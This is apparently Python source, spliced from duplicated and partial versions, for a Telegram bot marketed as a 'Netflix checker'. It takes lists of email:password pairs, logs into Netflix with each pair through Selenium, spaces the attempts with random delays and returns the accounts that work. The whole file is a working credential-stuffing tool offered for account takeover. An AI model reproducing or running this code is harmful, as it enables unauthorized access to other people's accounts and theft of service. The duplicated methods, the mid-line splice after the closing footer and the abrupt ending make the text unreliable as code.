                        logger.error("❌ All URL attempts failed")
                        if driver:
                            self.cleanup_driver_simple(driver)
                        return False, "Cannot reach Netflix"
                
                # Login process
                time.sleep(3)
                
                try:
                    # Find email field
                    email_selectors = [
                        (By.ID, "id_userLoginId"),
                        (By.NAME, "userLoginId"),
                        (By.CSS_SELECTOR, "input[type='email']"),
                        (By.CSS_SELECTOR, "input[data-uia='login-field']")
                    ]
                    
                    email_field = None
                    for by, selector in email_selectors:
                        try:
                            email_field = WebDriverWait(driver, 10).until(
                                EC.presence_of_element_located((by, selector))
                            )
                            break
                        except TimeoutException:
                            continue
                    
                    if not email_field:
                        if driver:
                            self.cleanup_driver_simple(driver)
                        return False, "Email field not found"
                    
                    email_field.clear()
                    email_field.send_keys(email)
                    time.sleep(1)
                    
                    # Find password field
                    password_field = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                    password_field.clear()
                    password_field.send_keys(password)
                    time.sleep(1)
                    
                    # Find and click login button
                    login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                    login_btn.click()
                    logger.info("✅ Login attempt made")
                    
                    # Wait for result - INCREASED WAIT TIME
                    time.sleep(10)
                    
                    # Success detection - FIXED LOGIC
                    current_url = driver.current_url
                    page_title = driver.title.lower()
                    page_source = driver.page_source.lower()
                    
                    logger.info(f"🔍 Checking login result - URL: {current_url}, Title: {page_title}")
                    
                    # STRICT SUCCESS CHECK: Must contain "/browse" in URL
                    if "/browse" in current_url:
                        logger.info("🎉 VALID ACCOUNT: %s - Redirected to browse page", email)
                        self.cleanup_driver_simple(driver)
                        return True, "Valid account"
                    
                    # Check for "Who's Watching" page (also valid success)
                    if "who's watching" in page_source or "profiles-gate" in current_url:
                        logger.info("🎉 VALID ACCOUNT: %s - Reached profiles selection", email)
                        self.cleanup_driver_simple(driver)
                        return True, "Valid account"
                    
                    # STRICT FAILURE CHECK: Still on login page or error messages
                    if "login" in current_url or "signin" in current_url:
                        logger.info("❌ INVALID: %s - Still on login page", email)
                        self.cleanup_driver_simple(driver)
                        return False, "Invalid credentials"
                    
                    # Check for specific error messages in page content
                    error_indicators = [
                        "sorry, we can't find an account with this email",
                        "incorrect password",
                        "your account could not be signed in",
                        "something went wrong",
                        "error",
                        "invalid email or password"
                    ]
                    
                    for error in error_indicators:
                        if error in page_source:
                            logger.info("❌ INVALID: %s - %s", email, error)
                            self.cleanup_driver_simple(driver)
                            return False, error
                    
                    # If we're still on a login-related page but not the main login, it's invalid
                    if any(login_indicator in current_url for login_indicator in ['/login', 'signin']):
                        logger.info("❌ INVALID: %s - Login page variation", email)
                        self.cleanup_driver_simple(driver)
                        return False, "Invalid credentials"
                    
                    # Unknown state - take screenshot for debugging
                    try:
                        # Create screenshots directory if it doesn't exist
                        screenshots_dir = "debug_screenshots"
                        if not os.path.exists(screenshots_dir):
                            os.makedirs(screenshots_dir)
                        
                        # Create safe filename
                        safe_email = email.replace('@', '_').replace('.', '_')
                        timestamp = int(time.time())
                        screenshot_path = os.path.join(screenshots_dir, f"debug_{safe_email}_{timestamp}.png")
                        
                        driver.save_screenshot(screenshot_path)
                        logger.info(f"📸 Debug screenshot saved: {screenshot_path}")
                        
                        # Also save page source for debugging
                        page_source_path = os.path.join(screenshots_dir, f"debug_{safe_email}_{timestamp}.html")
                        with open(page_source_path, 'w', encoding='utf-8') as f:
                            f.write(driver.page_source)
                        logger.info(f"📄 Page source saved: {page_source_path}")
                        
                    except Exception as screenshot_error:
                        logger.warning(f"⚠️ Could not save debug files: {screenshot_error}")
                    
                    logger.info("❓ UNKNOWN STATE: %s - URL: %s, Title: %s", email, current_url, page_title)
                    self.cleanup_driver_simple(driver)
                    return False, f"Unknown login state - URL: {current_url}"
                    
                except Exception as e:
                    logger.error("🚨 Login process error for %s: %s", email, e)
                    if attempt < max_retries - 1:
                        logger.info("🔄 Retrying after login error...")
                        if driver:
                            self.cleanup_driver_simple(driver)
                        continue
                    else:
                        if driver:
                            self.cleanup_driver_simple(driver)
                        return False, f"Login error: {str(e)}"
                
            except Exception as e:
                logger.error("🚨 General error for %s: %s", email, e)
                if attempt < max_retries - 1:
                    logger.info("🔄 Retrying after general error...")
                    if driver:
                        self.cleanup_driver_simple(driver)
                    continue
                else:
                    if driver:
                        self.cleanup_driver_simple(driver)
                    return False, f"General error: {str(e)}"
        
        if driver:
            self.cleanup_driver_simple(driver)
        return False, "Max retries exceeded"

    def cleanup_driver_simple(self, driver):
        """Simple driver cleanup with timeout protection"""
        try:
            driver.quit()
            time.sleep(1)  # Small delay to ensure cleanup
        except Exception as e:
            logger.warning("⚠️ Driver cleanup warning: %s", e)
        finally:
            try:
                driver.service.process.kill()
            except:
                pass

    def run(self):
        """Run the bot with platform-specific optimizations"""
        logger.info("🚀 Starting Universal Netflix Checker Bot...")
        logger.info("💎 Developed by @unknownnumeralx")
        logger.info("🌍 Platform: %s", self.platform.upper())
        logger.info("🔧 GeckoDriver: %s", "FOUND" if self.geckodriver_path else "NOT FOUND")
        
        # Platform-specific polling settings
        polling_configs = {
            'railway': {'poll_interval': 1.0, 'timeout': 30},
            'render': {'poll_interval': 1.0, 'timeout': 30},
            'heroku': {'poll_interval': 2.0, 'timeout': 30},
            'termux': {'poll_interval': 3.0, 'timeout': 45},
            'vps': {'poll_interval': 0.5, 'timeout': 20},
            'unknown': {'poll_interval': 1.0, 'timeout': 30}
        }
        
        config = polling_configs.get(self.platform, polling_configs['unknown'])
        
        logger.info("⚡ Bot is now running...")
        logger.info("📱 Use /start to begin checking accounts")
        
        # Start polling
        self.application.run_polling(
            poll_interval=config['poll_interval'],
            timeout=config['timeout'],
            drop_pending_updates=True
        )

def get_bot_token():
    """Get bot token from multiple sources with priority"""
    
    # 1. Environment variable (for cloud deployment)
    env_token = os.environ.get('BOT_TOKEN')
    if env_token and env_token != "YOUR_BOT_TOKEN_HERE":
        logger.info("✅ Bot token loaded from environment variable")
        return env_token
    
    # 2. Config file
    try:
        if os.path.exists("config.py"):
            import importlib.util
            spec = importlib.util.spec_from_file_location("config", "config.py")
            config_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(config_module)
            
            if hasattr(config_module, 'BOT_TOKEN') and config_module.BOT_TOKEN and config_module.BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
                logger.info("✅ Bot token loaded from config.py")
                return config_module.BOT_TOKEN
    except Exception as e:
        logger.warning("❌ Error reading config.py: %s", e)
    
    return None

def setup_bot_token():
    """Interactive setup for bot token"""
    print("\n" + "="*50)
    print("💎 𝗔n𝟬𝗡𝗢t𝗙 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 SETUP")
    print("="*50)
    
    if os.path.exists("config.py"):
        print("✅ config.py found! Checking token...")
        try:
            import importlib.util
            spec = importlib.util.spec_from_file_location("config", "config.py")
            config_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(config_module)
            
            if hasattr(config_module, 'BOT_TOKEN') and config_module.BOT_TOKEN and config_module.BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
                print("✅ Valid token found in config.py!")
                return config_module.BOT_TOKEN
        except:
            print("❌ Error reading existing config.py")
    
    print("\n🔑 BOT TOKEN SETUP")
    print("Get your token from @BotFather on Telegram")
    print("\nPlease enter your bot token:")
    
    token = input("Token: ").strip()
    
    if not token or token == "YOUR_BOT_TOKEN_HERE":
        print("❌ Invalid token provided!")
        return None
    
    try:
        with open("config.py", "w") as f:
            f.write(f'# 💎 𝗔n𝟬𝗡𝗢t𝗙 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 Configuration\n')
            f.write(f'BOT_TOKEN = "{token}"\n')
            f.write(f'\n# Platform-Specific Settings\n')
            f.write(f'MAX_ACCOUNTS_RAILWAY = 100\n')
            f.write(f'MAX_ACCOUNTS_RENDER = 100\n')
            f.write(f'MAX_ACCOUNTS_HEROKU = 50\n')
            f.write(f'MAX_ACCOUNTS_TERMUX = 50\n')
            f.write(f'MAX_ACCOUNTS_VPS = 500\n')
        
        print("✅ config.py created successfully!")
        return token
        
    except Exception as e:
        print(f"❌ Error creating config.py: {e}")
        return None

if __name__ == "__main__":
    # Get bot token
    BOT_TOKEN = get_bot_token()
    
    if not BOT_TOKEN:
        print("❌ BOT_TOKEN not found!")
        BOT_TOKEN = setup_bot_token()
    
    if not BOT_TOKEN:
        print("\n🚫 Cannot start bot without token!")
        print("\n💡 Setup Methods:")
        print("1. Create config.py with: BOT_TOKEN = 'your_token'")
        print("2. Set environment variable: export BOT_TOKEN='your_token'")
        print("3. Edit the code and set HARDCODED_TOKEN")
        print("\n🇰🇪 Get token from @BotFather on Telegram")
        exit(1)
    
    # Start the universal bot
    print("\n🎉 𝗔n𝟬𝗡𝗢t𝗙 𝗣𝗥𝗘𝗠𝗜𝗨𝗠 𝗡𝗘𝗧𝗙𝗟𝗜𝗑 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧 Starting...")
    print("💎 Developed by @unknownnumeralx")
    print("🇰🇪 Made in Kenya with 254 Vibes!")
    bot = UniversalNetflixCheckerBot(BOT_TOKEN)
    bot.run()

# 💎 Thanks for using this premium script by @unknownnumeralx
# 🌟 Developed in KENYA 🇰🇪 254 vibes 💎 💎 💎 🇰🇪
# 🚀 We love Kenya 🇰🇪 We love Heis_Tech       elif self.platform == 'termux':
                driver.set_page_load_timeout(45)
                driver.set_script_timeout(20)
            else:  # VPS and others
                driver.set_page_load_timeout(25)
                driver.set_script_timeout(15)
                
            driver.implicitly_wait(5)
            
            # Set window size
            driver.set_window_size(390, 844)
            
            logger.info(f"✅ {self.platform.upper()}-Optimized Firefox Driver started!")
            return driver
            
        except Exception as e:
            logger.error(f"❌ {self.platform.upper()} Firefox startup failed: {e}")
            raise Exception(f"Firefox failed on {self.platform}: {e}")

    def setup_handlers(self):
        """Setup Telegram bot command and message handlers"""
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("status", self.status_command))
        self.application.add_handler(CommandHandler("platform", self.platform_command))
        self.application.add_handler(MessageHandler(filters.Document.ALL, self.handle_document))
        self.application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, self.handle_text_accounts))
        
        # Add error handler
        self.application.add_error_handler(self.error_handler)

    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle Telegram API errors"""
        error = context.error
        
        if isinstance(error, telegram.error.Conflict):
            logger.error("❌ Multiple bot instances detected! Stopping...")
            await self.application.stop()
            await self.application.shutdown()
            logger.info("✅ Bot stopped due to conflict. Please restart only one instance.")
        elif isinstance(error, telegram.error.NetworkError):
            logger.warning("🌐 Network error, retrying...")
        else:
            logger.error(f"⚠️ Unexpected error: {error}")

    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /start command"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        
        # Check network connectivity
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        platform_info = f"🌍 **Platform:** {self.platform.upper()}"
        
        try:
            await update.message.reply_animation(
                animation="https://media.giphy.com/media/l0HU7JI1m1eEwz8rC/giphy.gif",
                caption=f"🎬 **💎 Universal Netflix Checker💎**\n\n"
                       f"{platform_info}\n"
                       f"{driver_status}\n"
                       f"{network_status}\n\n"
                       "📁 Send me a .txt file OR direct text with accounts in format:\n"
                       "`email:password`\n\n"
                       "Each account on a new line.\n\n"
                       "⚡ **Status:** ✅ READY\n"
                       "👨‍💻 **DEV:** @unknownnumeralx\n\n"
                       "━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode='Markdown'
            )
        except:
            await update.message.reply_text(
                f"🎬 **💎 Universal Netflix Checker💎**\n\n"
                f"{platform_info}\n"
                f"{driver_status}\n"
                f"{network_status}\n\n"
                "📁 Send me a .txt file OR direct text with accounts in format:\n"
                "`email:password`\n\n"
                "Each account on a new line.\n\n"
                "⚡ **Status:** ✅ READY\n"
                "👨‍💻 **DEV:** @unknownnumeralx\n\n"
                "━━━━━━━━━━━━━━━━━━━━━━━━",
                parse_mode='Markdown'
            )

    async def status_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /status command"""
        driver_status = "✅ GeckoDriver READY!" if self.check_geckodriver_installation() else "❌ GeckoDriver NOT FOUND!"
        network_status = "✅ Network READY!" if await asyncio.get_event_loop().run_in_executor(None, self.check_network_connectivity) else "⚠️ Network issues detected"
        
        await update.message.reply_text(
            f"🤖 **Bot Status**\n\n"
            f"🌍 **Platform:** {self.platform.upper()}\n"
            f"{driver_status}\n"
            f"{network_status}\n"
            f"🔧 **System:** Operational\n"
            f"⚡ **Performance:** Optimized for {self.platform}\n"
            f"👨‍💻 **DEV:** @unknownnumeralx\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    async def platform_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle /platform command"""
        platform_info = {
            'railway': '🚄 Railway (Cloud)',
            'render': '☁️ Render (Cloud)',
            'heroku': '🦸 Heroku (Cloud)',
            'termux': '📱 Termux (Android)',
            'vps': '🖥️ VPS/Dedicated Server',
            'unknown': '❓ Unknown Environment'
        }
        
        current_platform = platform_info.get(self.platform, '❓ Unknown')
        
        await update.message.reply_text(
            f"🌍 **Platform Information**\n\n"
            f"**Current Platform:** {current_platform}\n"
            f"**Platform Code:** {self.platform}\n\n"
            f"**Supported Platforms:**\n"
            f"• 🚄 Railway\n"
            f"• ☁️ Render\n"
            f"• 🦸 Heroku\n"
            f"• 📱 Termux\n"
            f"• 🖥️ VPS/Server\n\n"
            f"**Optimizations:** ✅ Active\n"
            f"**Performance:** 🚀 Enhanced\n\n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )

    def create_progress_bar(self, percentage, length=20):
        """Create a visual progress bar"""
        filled = int(length * percentage / 100)
        empty = length - filled
        bar = "█" * filled + "▒" * empty
        return f"[{bar}] {percentage}%"

    async def update_progress(self, update: Update, context: ContextTypes.DEFAULT_TYPE, current: int, total: int, working_count: int = 0, failed_count: int = 0):
        """Update progress message"""
        percentage = min(100, int((current / total) * 100))
        progress_bar = self.create_progress_bar(percentage)
        
        status_message = (
            "━━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"[↯💎]An0nOtF Premium Checker[{self.platform.upper()}]💎\n\n"
            f"[↯] 𝙎𝙩𝙖𝙩𝙪𝙨 ↯ Processing ({total} accounts) \n"
            f"{progress_bar}\n"
            f"[↯] 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 ↯ {working_count} found\n"
            f"[↯] 𝙁𝙖𝙞𝙡𝙚𝙙 ↯ {failed_count} accounts\n"
            f"[↯] 𝙋𝙡𝙖𝙩𝙛𝙤𝙧𝙢 ↯ {self.platform}\n"
            f"[↯] 𝘿𝙀𝙑   ↯ @unknownnumeralx \n"
            "━━━━━━━━━━━━━━━━━━━━━━━━"
        )
        
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.edit_message_text(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id'],
                    text=status_message
                )
            except Exception as e:
                new_message = await update.message.reply_text(status_message)
                context.user_data['progress_message_id'] = new_message.message_id
        else:
            new_message = await update.message.reply_text(status_message)
            context.user_data['progress_message_id'] = new_message.message_id

    async def cleanup_progress(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Clean up progress message"""
        if 'progress_message_id' in context.user_data:
            try:
                await context.bot.delete_message(
                    chat_id=update.effective_chat.id,
                    message_id=context.user_data['progress_message_id']
                )
                del context.user_data['progress_message_id']
            except Exception as e:
                logger.warning("Could not delete progress message: %s", e)

    async def handle_document(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle document messages (txt files)"""
        user = update.message.from_user
        logger.info("User %s sent a file", user.first_name)

        if not update.message.document.file_name.endswith('.txt'):
            await update.message.reply_text("❌ Please send a .txt file")
            return

        await update.message.reply_text("📥 File received! Starting account verification...")

        try:
            file = await update.message.document.get_file()
            file_path = f"temp_{update.message.document.file_name}"
            await file.download_to_drive(file_path)

            working_accounts = await self.process_accounts(file_path, update, context)

            # Send final results only
            if working_accounts:
                result_message = self.format_results(working_accounts)
                if len(result_message) > 4000:
                    parts = [result_message[i:i+4000] for i in range(0, len(result_message), 4000)]
                    for part in parts:
                        await update.message.reply_text(part, parse_mode='Markdown')
                else:
                    await update.message.reply_text(result_message, parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ No working accounts found.")

            if os.path.exists(file_path):
                os.remove(file_path)
                
            await self.cleanup_progress(update, context)

        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
            logger.error("Error: %s", str(e))
            await self.cleanup_progress(update, context)

    async def handle_text_accounts(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Handle text messages with accounts"""
        user = update.message.from_user
        text = update.message.text.strip()
        logger.info("User %s sent text accounts", user.first_name)

        if ':' not in text and '\n' not in text:
            await update.message.reply_text(
                "📁 Send me accounts in format:\n"
                "`email:password`\n\n"
                "Example:\n"
                "user1@gmail.com:password123\n"
                "user2@yahoo.com:pass456\n"
                "user3@hotmail.com:secret789\n\n"
                "Or send a .txt file with the same format."
                "use /platform to check platform status", 
                parse_mode='Markdown'
            )
            return

        await update.message.reply_text("📥 Text accounts received! Starting verification...")

        file_path = f"temp_text_{user.id}_{int(time.time())}.txt"
        try:
            with open(file_path, 'w', encoding='utf-8') as f:
                f.write(text)

            working_accounts = await self.process_accounts(file_path, update, context)

            # Send final results only
            if working_accounts:
                result_message = self.format_results(working_accounts)
                if len(result_message) > 4000:
                    parts = [result_message[i:i+4000] for i in range(0, len(result_message), 4000)]
                    for part in parts:
                        await update.message.reply_text(part, parse_mode='Markdown')
                else:
                    await update.message.reply_text(result_message, parse_mode='Markdown')
            else:
                await update.message.reply_text("❌ No working accounts found.")

        except Exception as e:
            await update.message.reply_text(f"❌ Error: {str(e)}")
            logger.error("Error: %s", str(e))
        finally:
            if os.path.exists(file_path):
                os.remove(file_path)
            await self.cleanup_progress(update, context)

    async def process_accounts(self, file_path, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Process accounts from file with network check"""
        
        # Check network before starting
        network_ok = await asyncio.get_event_loop().run_in_executor(
            None, self.check_network_connectivity
        )
        
        if not network_ok:
            await update.message.reply_text(
                "❌ **Network Connection Issue**\n\n"
                "Cannot reach Netflix servers. Possible reasons:\n"
                "• Network firewall blocking Netflix\n"
                "• DNS resolution issues\n"
                "• IP address blocked by Netflix\n"
                "• Server network restrictions\n\n"
                "Trying anyway with enhanced retry logic..."
            )
        
        working_accounts = []
        failed_accounts = 0
        
        try:
            with open(file_path, 'r', encoding='utf-8') as file:
                accounts = [line.strip() for line in file if ':' in line.strip()]
        except Exception as e:
            await update.message.reply_text(f"❌ Error reading file: {str(e)}")
            return []
        
        total_accounts = len(accounts)
        if total_accounts == 0:
            await update.message.reply_text("❌ No valid accounts found. Format should be email:password")
            return []
        
        # Platform-specific batch limits
        batch_limits = {
            'railway': 500,
            'render': 500,
            'heroku': 100,
            'termux': 50,
            'vps': 500,
            'unknown': 100
        }
        
        max_accounts = batch_limits.get(self.platform, 100)
        if total_accounts > max_accounts:
            await update.message.reply_text(
                f"⚠️ **Large Batch Notice**\n\n"
                f"Platform: {self.platform.upper()}\n"
                f"Accounts: {total_accounts}\n"
                f"Recommended: {max_accounts}\n\n"
                f"⏰ **Estimated Time:** {total_accounts * 25 // 60} minutes\n"
                f"🔧 **Optimizing for {self.platform}...**"
            )
            
        await update.message.reply_text(f"🔍 Found {total_accounts} accounts to test on {self.platform.upper()}...")
        await self.update_progress(update, context, 0, total_accounts, len(working_accounts), failed_accounts)

        for i, line in enumerate(accounts, 1):
            try:
                email, password = line.split(':', 1)
                email = email.strip()
                password = password.strip()
            except ValueError:
                logger.warning("Invalid format: %s", line)
                failed_accounts += 1
                continue
            
            await self.update_progress(update, context, i, total_accounts, len(working_accounts), failed_accounts)
            
            # Platform-specific delays
            delay_ranges = {
                'railway': (3.0, 6.0),
                'render': (3.0, 6.0),
                'heroku': (4.0, 8.0),
                'termux': (5.0, 10.0),
                'vps': (2.0, 4.0),
                'unknown': (3.0, 6.0)
            }
            
            if i > 1:
                min_delay, max_delay = delay_ranges.get(self.platform, (3.0, 6.0))
                delay = random.uniform(min_delay, max_delay)
                await asyncio.sleep(delay)
            
            try:
                success, message = await asyncio.get_event_loop().run_in_executor(
                    None, self.test_netflix_account_detailed, email, password
                )
                if success:
                    working_accounts.append((email, password))
                    logger.info("🎉 WORKING: %s", email)
                else:
                    failed_accounts += 1
                    logger.info("❌ FAILED: %s - %s", email, message)
                    
            except Exception as e:
                failed_accounts += 1
                logger.error("🚨 ERROR: %s - %s", email, e)

        # Final results
        logger.info("📊 FINAL: %d working, %d failed out of %d total on %s", 
                    len(working_accounts), failed_accounts, total_accounts, self.platform)
        
        if working_accounts:
            logger.info("✅ WORKING ACCOUNTS:")
            for email, password in working_accounts:
                logger.info("   📧 %s", email)
        
        return working_accounts

    def test_netflix_account_detailed(self, email, password):
        """Universal Netflix testing with SIMPLIFIED browser cleanup"""
        driver = None
        max_retries = 2
        
        for attempt in range(max_retries):
            try:
                driver = self.get_platform_optimized_driver()
                logger.info("🆕 NEW SESSION: Testing %s (Attempt %d/%d on %s)", email, attempt + 1, max_retries, self.platform)
                
                # 🎯 ORIGINAL NETFLIX URLs - NO MODIFICATIONS
                netflix_urls = [
                    "https://www.netflix.com/login",
                    "https://netflix.com/login",
                    "https://www.netflix.com/ke/login",
                    "https://netflix.com/"
                ]
                
                success = False
                for current_url in netflix_urls:
                    try:
                        logger.info("🌐 Trying URL: %s", current_url)
                        
                        driver.set_page_load_timeout(25)
                        driver.get(current_url)
                        
                        WebDriverWait(driver, 10).until(
                            lambda d: d.execute_script("return document.readyState") == "complete"
                        )
                        
                        if "netflix" in driver.current_url.lower():
                            logger.info("✅ Netflix page loaded successfully")
                            success = True
                            break
                        
                    except TimeoutException:
                        logger.warning("⚠️ Timeout loading: %s", current_url)
                        continue
                    except Exception as e:
                        logger.warning("⚠️ Error loading %s: %s", current_url, e)
                        continue
                
                if not success:
                    if attempt < max_retries - 1:
                        logger.info("🔄 Retrying after page load failure...")
                        if driver:
                            self.cleanup_driver_simple(driver)
                        continue
                    else:
                        logger.error("❌ All URL attempts failed")
                        return False, "Cannot reach Netflix"
                
                # Login process
                time.sleep(3)
                
                try:
                    # Find email field
                    email_selectors = [
                        (By.ID, "id_userLoginId"),
                        (By.NAME, "userLoginId"),
                        (By.CSS_SELECTOR, "input[type='email']"),
                        (By.CSS_SELECTOR, "input[data-uia='login-field']")
                    ]
                    
                    email_field = None
                    for by, selector in email_selectors:
                        try:
                            email_field = WebDriverWait(driver, 10).until(
                                EC.presence_of_element_located((by, selector))
                            )
                            break
                        except TimeoutException:
                            continue
                    
                    if not email_field:
                        return False, "Email field not found"
                    
                    email_field.clear()
                    email_field.send_keys(email)
                    time.sleep(1)
                    
                    # Find password field
                    password_field = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                    password_field.clear()
                    password_field.send_keys(password)
                    time.sleep(1)
                    
                    # Find and click login button
                    login_btn = driver.find_element(By.CSS_SELECTOR, "button[type='submit']")
                    login_btn.click()
                    logger.info("✅ Login attempt made by filling all creditials")
                    
                    # Wait for result
                    time.sleep(8)
                    
                    # Success detection
                    current_url = driver.current_url
                    
                    if "/browse" in current_url:
                        logger.info("🎉 VALID ACCOUNT: %s", email)
                        self.cleanup_driver_simple(driver)
                        return True, "Valid account"
                    
                    if "login" in current_url or "signin" in current_url:
                        logger.info("❌ INVALID: %s", email)
                        self.cleanup_driver_simple(driver)
                        return False, "Invalid credentials"
                    
                    # Unknown state
                    self.cleanup_driver_simple(driver)
                    return False, "Unknown login state"
                    
                except Exception as e:
                    logger.error("🚨 Login process error: %s", e)
                    if attempt < max_retries - 1:
                        logger.info("🔄 Retrying login process...")
                        if driver:
                            self.cleanup_driver_simple(driver)
                        continue
                    else:
                        if driver:
                            self.cleanup_driver_simple(driver)
                        return False, f"Login error: {str(e)}"
                
            except Exception as e:
                logger.error("🚨 Overall testing error: %s", e)
                if attempt < max_retries - 1:
                    logger.info("🔄 Retrying entire test...")
                    if driver:
                        self.cleanup_driver_simple(driver)
                    continue
                else:
                    if driver:
                        self.cleanup_driver_simple(driver)
                    return False, f"Testing failed: {str(e)}"
            finally:
                # 🔥 EXTRA SAFETY: Always cleanup driver
                if driver:
                    self.cleanup_driver_simple(driver)
        
        return False, "All retries exhausted"

    def cleanup_driver_simple(self, driver):
        """SIMPLE browser cleanup - only cookies, localStorage, sessionStorage"""
        try:
            logger.info("🧹 Starting SIMPLE browser cleanup...")
            
            # 1. Clear all cookies
            driver.delete_all_cookies()
            logger.info("✅ Cookies cleared")
            
            # 2. Clear localStorage
            driver.execute_script("window.localStorage.clear();")
            logger.info("✅ LocalStorage cleared")
            
            # 3. Clear sessionStorage
            driver.execute_script("window.sessionStorage.clear();")
            logger.info("✅ SessionStorage cleared")
            
            # 4. Quit driver
            driver.quit()
            logger.info("✅ Driver shut down")
            
        except Exception as e:
            logger.error("❌ Error during cleanup: %s", e)
            try:
                driver.quit()
            except:
                pass

    def format_results(self, working_accounts):
        """Format working accounts for display"""
        if not working_accounts:
            return "❌ No working accounts found."
        
        result = f"✅ **💎 WORKING ACCOUNTS FOUND ({len(working_accounts)}):** 💎\n\n"
        
        for i, (email, password) in enumerate(working_accounts, 1):
            result += f"{i}. 📧 `{email}`\n   🔑 `{password}`\n\n"
        
        result += f"🎉 **Testing completed on {self.platform.upper()}!**\n"
        result += "Watch endlessly on Netflix 🇰🇪\n"
        result += "👨‍💻 **DEV:** @unknownnumeralx\n"
        result += "━━━━━━━━━━━━━━━━━━━━━━━━"
        return result

    async def on_startup(self, application):
        """Called when the bot starts"""
        logger.info(f"🚀 An0nOtF Premium Netflix Checker started on {self.platform.upper()}!")
        logger.info("🔒 SECURITY: Simple browser cleanup enabled")
        logger.info("🌐 NETWORK: Using original Netflix URLs only")
        logger.info("Bot is now running and ready to receive commands")
        logger.info("Use /start to begin checking Netflix accounts")
        logger.info("Use /platform to see platform information")
        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━")

    def run(self):
        """Run the bot with platform optimization"""
        logger.info("🚀 Starting Universal Netflix Checker...")
        logger.info("Developed by: @unknownnumeralx")
        logger.info(f"Platform: {self.platform.upper()}")
        logger.info("🔒 SECURITY FEATURES:")
        logger.info("  • Simple browser cleanup after each account")
        logger.info("  • Cookies cleared")
        logger.info("  • LocalStorage cleared")
        logger.info("  • SessionStorage cleared")
        logger.info("  • Original Netflix URLs only")
        logger.info("━━━━━━━━━━━━━━━━━━━━━━━━")
        
        if self.check_geckodriver_installation():
            logger.info("✅ GeckoDriver is installed and ready!")
        else:
            logger.warning("❌ GeckoDriver not found. Users will be notified.")
        
        # Platform-specific startup message
        startup_messages = {
            'railway': "🚄 Running on Railway Cloud",
            'render': "☁️ Running on Render Cloud",
            'heroku': "🦸 Running on Heroku Cloud",
            'termux': "📱 Running on Termux (Android)",
            'vps': "🖥️ Running on VPS/Dedicated Server",
            'unknown': "❓ Running on Unknown Platform"
        }
        
        logger.info(startup_messages.get(self.platform, "🚀 Bot started successfully!"))
        
        # Run the bot
        self.application.run_polling(
            drop_pending_updates=True,
            allowed_updates=Update.ALL_TYPES,
            close_loop=False
        )

# Configuration and setup functions remain the same as previous version
def get_bot_token():
    """Get bot token from multiple sources with priority"""
    
    # Environment variable (for cloud deployment)
    env_token = os.environ.get('BOT_TOKEN')
    if env_token and env_token != "YOUR_BOT_TOKEN_HERE":
        logger.info("✅ Bot token loaded from environment variable")
        return env_token
    
    # Config file
    try:
        if os.path.exists("config.py"):
            import importlib.util
            spec = importlib.util.spec_from_file_location("config", "config.py")
            config_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(config_module)
            
            if hasattr(config_module, 'BOT_TOKEN') and config_module.BOT_TOKEN and config_module.BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
                logger.info("✅ Bot token loaded from config.py")
                return config_module.BOT_TOKEN
    except Exception as e:
        logger.warning("❌ Error reading config.py: %s", e)
    
    # Hardcoded token
    HARDCODED_TOKEN = "YOUR_BOT_TOKEN_HERE"
    if HARDCODED_TOKEN and HARDCODED_TOKEN != "YOUR_BOT_TOKEN_HERE":
        logger.info("✅ Bot token loaded from hardcoded value")
        return HARDCODED_TOKEN
    
    return None

def setup_bot_token():
    """Interactive setup for bot token"""
    print("\n" + "="*50)
    print("💎An0nOtF NETFLIX CHECKER BOT SETUP")
    print("="*50)
    
    if os.path.exists("config.py"):
        print("✅ config.py found! Checking token...")
        try:
            import importlib.util
            spec = importlib.util.spec_from_file_location("config", "config.py")
            config_module = importlib.util.module_from_spec(spec)
            spec.loader.exec_module(config_module)
            
            if hasattr(config_module, 'BOT_TOKEN') and config_module.BOT_TOKEN and config_module.BOT_TOKEN != "YOUR_BOT_TOKEN_HERE":
                print("✅ Valid token found in config.py!")
                return config_module.BOT_TOKEN
        except:
            print("❌ Error reading existing config.py")
    
    print("\n🔑 BOT TOKEN SETUP")
    print("Get your token from @BotFather on Telegram")
    print("\nPlease enter your bot token:")
    
    token = input("Token: ").strip()
    
    if not token or token == "YOUR_BOT_TOKEN_HERE":
        print("❌ Invalid token provided!")
        return None
    
    try:
